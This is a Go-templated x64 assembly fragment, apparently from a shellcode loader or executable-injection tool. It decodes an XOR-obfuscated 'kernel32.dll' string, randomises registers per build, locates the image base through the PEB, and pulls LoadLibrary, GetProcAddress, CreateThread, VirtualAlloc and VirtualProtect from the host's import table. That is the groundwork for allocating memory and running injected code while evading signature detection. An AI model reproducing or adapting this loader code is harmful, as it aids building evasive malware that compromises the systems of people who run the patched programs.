.code64

// r10 store address of ImageBaseAddress
// r11 store address of kernel32.dll
// r12 store address of GetProcAddress
// r13 store address of CreateThread
// r14 store address of VirtualAlloc
// r15 store address of VirtualProtect

entry:
  // find CreateThread, VirtualAlloc and VirtualProtect
{{if .LackProcedure}}
  // push kernel32.dll\0 to stack
  mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}
  mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}
  xor {{.Reg.rax}}, {{.Reg.r8}}
  push {{.Reg.rax}}
  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB 1}}
  mov {{.Reg.r9}},  {{index .Kernel32DLLKey 1}}
  xor {{.Reg.rbx}}, {{.Reg.r9}}
  push {{.Reg.rbx}}

  {{if .LoadLibraryWOnly}}
    mov {{.Reg.rcx}}, {{index .Kernel32DLLDB 2}}
    mov {{.Reg.r10}}, {{index .Kernel32DLLKey 2}}
    xor {{.Reg.rcx}}, {{.Reg.r10}}
    push {{.Reg.rcx}}
    mov {{.Reg.rdx}}, {{index .Kernel32DLLDB 3}}
    mov {{.Reg.r11}}, {{index .Kernel32DLLKey 3}}
    xor {{.Reg.rdx}}, {{.Reg.r11}}
    push {{.Reg.rdx}}
  {{end}}

  // get a pointer to the PEB
  xor {{.Reg.rax}}, {{.Reg.rax}}
  mov {{.Reg.rax}}, 0x60
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
  // store image base address
  mov {{.RegS.r10}}, [{{.Reg.rbx}} + 0x10]

  // read the LoadLibraryA/W form IAT
  mov {{.RegS.rbx}}, {{.RegS.r10}}
  add {{.RegS.rbx}}, {{hex .LoadLibrary}}
  mov {{.RegS.rbx}}, [{{.RegS.rbx}}]

  // load kernel32.dll
  mov rcx, rsp
  sub rsp, 0x20
  call {{.RegS.rbx}}
  add rsp, 0x20

  // store the handle of kernel32.dll
  mov {{.RegS.r11}}, rax

  // restore stack for "kernel32.dll"
  {{if .LoadLibraryWOnly}}
    add rsp, 4*8
  {{else}}
    add rsp, 2*8
  {{end}}

  // read the GetProcAddress form IAT
  mov {{.Reg.rax}}, {{.RegS.r10}}
  add {{.Reg.rax}}, {{hex .GetProcAddress}}
  mov {{.RegS.r12}}, [{{.Reg.rax}}]

  // get the procedure address
  {{if .LackCreateThread}}

  {{else}}
    mov {{.Reg.rbx}}, {{.RegS.r10}}
    add {{.Reg.rbx}}, {{hex .CreateThread}}
    mov {{.RegS.r13}}, [{{.Reg.rbx}}]
  {{end}}

  {{if .LackVirtualAlloc}}

  {{else}}
    mov {{.Reg.rcx}}, {{.RegS.r10}}
    add {{.Reg.rcx}}, {{hex .VirtualAlloc}}
    mov {{.RegS.r14}}, [{{.Reg.rcx}}]
  {{end}}

  {{if .LackVirtualProtect}}

  {{else}}
    mov {{.Reg.rdx}}, {{.RegS.r10}}
    add {{.Reg.rdx}}, {{hex .VirtualProtect}}
    mov {{.RegS.r15}}, [{{.Reg.rdx}}]
  {{end}}

{{else}}
  // get a pointer to the PEB
  xor {{.Reg.rax}}, {{.Reg.rax}}
  mov {{.Reg.rax}}, 0x60
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
  // store image base address
  mov {{.RegS.r10}}, [{{.Reg.rbx}} + 0x10]

{{end}}

  int3
